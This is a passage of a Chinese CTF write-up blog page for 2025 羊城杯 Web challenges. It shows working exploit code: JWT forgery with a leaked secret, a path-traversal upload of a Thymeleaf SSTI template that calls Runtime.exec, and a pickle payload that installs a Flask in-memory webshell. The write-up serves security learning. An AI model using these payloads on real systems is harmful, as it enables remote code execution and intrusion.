jwtTokenProvider;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SecurityConfig</span><span class="params">(JwtTokenProvider jwtTokenProvider)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtTokenProvider = jwtTokenProvider;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserDetailsService <span class="title function_">userDetailsService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InMemoryUserDetailsService</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ((HttpSecurity)http.csrf().disable()).authorizeHttpRequests((authz) -&gt; ((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)((AuthorizeHttpRequestsConfigurer.AuthorizedUrl)authz.requestMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/upload&quot;</span>&#125;)).hasRole(<span class="string">&quot;USER&quot;</span>).requestMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;)).hasRole(<span class="string">&quot;USER&quot;</span>).anyRequest()).permitAll()).addFilterBefore(<span class="keyword">new</span> <span class="title class_">JwtAuthenticationFilter</span>(<span class="built_in">this</span>.jwtTokenProvider, <span class="built_in">this</span>.userDetailsService()), UsernamePasswordAuthenticationFilter.class).formLogin((form) -&gt; form.loginPage(<span class="string">&quot;/login/dynamic-template?value=login&quot;</span>).permitAll());</span><br><span class="line">        <span class="keyword">return</span> (SecurityFilterChain)http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>用代码里的 secret 伪造 jwt :</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;25d55ad283aa400af464c76d713c07add57f21e6a273781dbf8b7657940f3b03&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;sub&#x27;</span>: <span class="string">&#x27;user1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;iat&#x27;</span>: datetime.datetime.utcnow(),</span><br><span class="line">    <span class="string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">24</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成的JWT Token:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decoded = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n验证成功，解码后的内容:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(decoded)</span><br><span class="line"><span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Token验证失败&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ezsignin</span><br></pre></td></tr></table></figure></div>
+
+<p>由于目标有 thymeleaf 依赖 , 又有上传功能 , 很明显是打 SSTI , 在配置文件中可以看到模板文件位于 templates&#x2F;</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760175725711-b80aa206-730a-4d6c-8a25-79de7b98757a.png"
+                     
+                ></p>
+<p>于是可以目录穿越上传模板文件</p>
+<p>先传要执行的命令放在文件里面传上去 :</p>
+<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload?imgName=../templates/23</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>45.40.247.139:27783</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3Q5lUoVRliGsjlyW</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>139</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsImlhdCI6MTc2MDE2MTcyNiwiZXhwIjoxNzYwMjQ4MTI2fQ.Bsr4jGmkZCQEBL8Kon6V2VPIotQp7Rau68R3qt-JOps</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundary3Q5lUoVRliGsjlyW</span></span></span><br><span class="line"><span class="language-jboss-cli">Content-Disposition: form-data; name=<span class="string">&quot;imgFile&quot;</span>; filename=<span class="string">&quot;../templates/23&quot;</span></span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br><span class="line"><span class="language-jboss-cli">env  &gt; <span class="string">./templates/env1.html</span></span></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundary3Q5lUoVRliGsjlyW--</span></span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后会生成一个 23.html 文件 , 接着我们上传 poc , 执行的命令是用 sh 去运行刚才的文件 :</p>
+<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload?imgName=../templates/24</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>45.40.247.139:27783</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3Q5lUoVRliGsjlyW</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>139</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsImlhdCI6MTc2MDE2MTcyNiwiZXhwIjoxNzYwMjQ4MTI2fQ.Bsr4jGmkZCQEBL8Kon6V2VPIotQp7Rau68R3qt-JOps</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundary3Q5lUoVRliGsjlyW</span></span></span><br><span class="line"><span class="language-jboss-cli">Content-Disposition: form-data; name=<span class="string">&quot;imgFile&quot;</span>; filename=<span class="string">&quot;../templates/24&quot;</span></span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br><span class="line"><span class="language-jboss-cli">&lt;html lang=<span class="string">&quot;en&quot;</span> xmlns<span class="function">:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="language-jboss-cli">&lt;p th<span class="function">:text</span>=&#x27;$&#123;__$&#123;new.org.<span class="string">.apache.tomcat.util.IntrospectionUtils</span><span class="params">()</span><span class="string">.getClass</span><span class="params">()</span><span class="string">.callMethodN</span><span class="params">(new.org..apache.tomcat.util.IntrospectionUtils()</span><span class="string">.getClass</span><span class="params">()</span><span class="string">.callMethodN</span><span class="params">(new.org..apache.tomcat.util.IntrospectionUtils()</span><span class="string">.getClass</span><span class="params">()</span><span class="string">.findMethod</span><span class="params">(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils()</span><span class="string">.getClass</span><span class="params">()</span><span class="string">.getClassLoader</span><span class="params">()</span>)<span class="string">.loadClass</span><span class="params">(&quot;java.lang.Runtime&quot;)</span>,<span class="string">&quot;getRuntime&quot;</span>,null),<span class="string">&quot;invoke&quot;</span>,&#123;null,null&#125;,&#123;new.org.<span class="string">.springframework.instrument.classloading.ShadowingClassLoader</span><span class="params">(new.org..apache.tomcat.util.IntrospectionUtils()</span><span class="string">.getClass</span><span class="params">()</span><span class="string">.getClassLoader</span><span class="params">()</span>)<span class="string">.loadClass</span><span class="params">(&quot;java.lang.Object&quot;)</span>,new.org.<span class="string">.springframework.instrument.classloading.ShadowingClassLoader</span><span class="params">(new.org..apache.tomcat.util.IntrospectionUtils()</span><span class="string">.getClass</span><span class="params">()</span><span class="string">.getClassLoader</span><span class="params">()</span>)<span class="string">.loadClass</span><span class="params">(&quot;org.&quot;+&quot;thymeleaf.util.ClassLoaderUtils&quot;)</span><span class="string">.loadClass</span><span class="params">(&quot;[Ljava.lang.Object;&quot;)</span>&#125;),<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;sh ./templates/23.html&quot;</span>,new.org.<span class="string">.springframework.instrument.classloading.ShadowingClassLoader</span><span class="params">(new.org..apache.tomcat.util.IntrospectionUtils()</span><span class="string">.getClass</span><span class="params">()</span><span class="string">.getClassLoader</span><span class="params">()</span>)<span class="string">.loadClass</span><span class="params">(&quot;java.lang.String&quot;)</span>)&#125;__&#125;&#x27;&gt;&lt;<span class="string">/p</span>&gt;</span></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundary3Q5lUoVRliGsjlyW--</span></span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>接着访问 &#x2F;login&#x2F;dynamic-template?value&#x3D;24 去触发 payload</p>
+<p>最后访问 &#x2F;login&#x2F;dynamic-template?value&#x3D;env1 就可以看到命令执行的结果</p>
+<h1 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h1><p>访问目标 , 提示访客只能用访客账号登录 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760184054859-ecb425a8-f3f0-4617-9143-b2241e429141.png"
+                     
+                ></p>
+<p>guest : guest 成功登录进去</p>
+<p>将 Cookie 中的 Token 十六进制解码可以看到一些可疑字符串 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760184216198-5768b672-e729-4c26-8861-f777a4fc05f5.png"
+                     
+                ></p>
+<p>问 ai 可以知道这是一段 pickle 反序列化数据 , 于是尝试打内存马 :</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>():</span><br><span class="line">	def <span class="title function_">__reduce__</span><span class="params">(self)</span>:</span><br><span class="line">		<span class="keyword">return</span> (exec,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">print((pickle.dumps(Evil()).hex()))</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a?cmd=cat%<span class="number">20</span>/thisisthefffflllaaaggg.txt</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="staticNodeService"><a href="#staticNodeService" class="headerlink" title="staticNodeService"></a>staticNodeService</h1><p>可以 PUT 上传文件 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760188214310-e1e3906d-5f6b-4c7f-9dfc-3dd837f53818.png"
+                     
+                ></p>
+<p>但是文件名不能以 js 结尾 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760188789512-78d8f8fd-7626-4a48-8b05-4f2d608a7e9f.png"
+                     
+                ></p>
+<p>用 <code>/.</code> 绕过 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760189429346-6a46c431-b3d6-4406-8bb0-e825844b3f7a.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760189446652-7f0431d9-2819-457a-9bdc-2d72173e577d.png"
+                     
+                ></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2025-羊城杯-Web</li>
+        <li><strong>Author:</strong> exp3n5ive</li>
+        <li><strong>Created at
+                :</strong> 2025-10-13 17:33:43</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-10-13 17:35:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://exp3n5ive.github.io/2025/10/13/羊城杯-2025/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/09/22/Jdk17&amp;CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Jdk17&amp;CC 下利用 TemplesImpl</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">2025-羊城杯-Web</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-unserialize"><span class="nav-text">ez_unserialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#authweb"><span class="nav-text">authweb</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-blog"><span class="nav-text">ez_blog</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#staticNodeService"><span class="nav-text">staticNodeService</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-chisel fa-regular fa-calendar"></i>&nbsp;&nbsp;<a href="/">exp3n5ive</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        5 posts in total
+                    </span>
+                    
+                        <span>
+                            30.2k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
